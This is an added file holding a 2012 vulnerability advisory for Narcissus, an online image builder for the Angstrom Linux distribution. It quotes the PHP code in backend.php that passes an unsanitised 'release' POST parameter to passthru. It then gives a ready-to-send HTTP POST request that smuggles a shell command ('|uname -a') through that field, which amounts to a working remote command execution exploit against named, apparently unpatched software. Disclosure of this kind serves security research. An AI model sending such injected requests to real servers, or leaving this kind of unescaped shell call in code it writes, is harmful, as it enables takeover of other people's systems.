@@ -1,0 +1,74 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-11-13                              ]
+ ##########################################################
+ #  [ Narcissus ] Remote Command Execution Vulnerability  #
+ ##########################################################
+ #
+ # Script: "Narcissus - Online image builder for the angstrom distribution"
+ #
+ # Vendor:   http://www.angstrom-distribution.org/
+ # Download: https://github.com/Angstrom-distribution/narcissus
+ #
+ # Vendor was informed some time ago, but did not respond yet.
+ #
+ ##########################################################
+ #
+ # [ Remote Command Execution ]
+ #
+ # File: /narcissus/backend.php ( lines: 10-183 ):
+ # ..cut..
+ # if (isset($_POST["action"]) && $_POST["action"] != "") {
+ #  $action = $_POST["action"];                              // 1
+ # } else {
+ #  print "Invalid action: $action";
+ #  exit;
+ # }
+ # 
+ # if (isset($_POST["machine"])) {
+ #  $machine = escapeshellcmd(basename($_POST["machine"]));  // 2
+ # } else {
+ #  print "Invalid machine";
+ #  exit;
+ # }
+ # ..cut..
+ # if (isset($_POST["release"]) && $_POST["release"] != "") {
+ #  $release = $_POST["release"];                            // 3
+ # } else {
+ #  $release = "stable";
+ # }
+ # ..cut..
+ # switch($action) {
+ # ..cut..
+ #  case "configure_image":                                  // 4
+ #     print "configuring\n";
+ #     configure_image($machine, $name, $release);           // 5
+ #     break;
+ # ..cut..
+ # function configure_image($machine, $name, $release) {
+ #  print "Machine: $machine, name: $name\n";
+ #  passthru ("scripts/configure-image.sh $machine $name-image $release && exit");  // 6 [RCE]
+ # }
+ # ..cut..
+ #
+ # Vuln:
+ # http://localhost/narcissus/backend.php
+ # 
+ # POST /narcissus/backend.php HTTP/1.1
+ # Host: localhost
+ # User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/16.0
+ # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ # Accept-Language: pl,en-us;q=0.7,en;q=0.3
+ # Accept-Encoding: gzip, deflate
+ # Connection: keep-alive
+ # Content-Type: application/x-www-form-urlencoded
+ # Content-Length: 50
+ # machine=0&action=configure_image&release=|uname -a
+ #
+ ### [ dun / 2012 ] #######################################
